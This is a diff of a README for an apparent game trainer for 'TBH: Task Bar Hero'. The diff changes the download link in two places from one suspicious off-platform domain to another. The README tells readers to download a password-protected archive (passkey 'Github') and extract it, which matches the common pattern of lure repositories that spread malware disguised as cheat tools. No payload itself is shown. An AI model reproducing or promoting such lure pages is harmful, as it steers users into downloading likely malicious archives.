@@ -9,7 +9,7 @@ TBH: Task Bar Hero trainer with God Mode, unlimited money, EXP multiplier, insta
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -97,7 +97,7 @@ This trainer adds God Mode, unlimited money, EXP multiplier, instant kill, and g
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 
 2. Extract the archive.
 
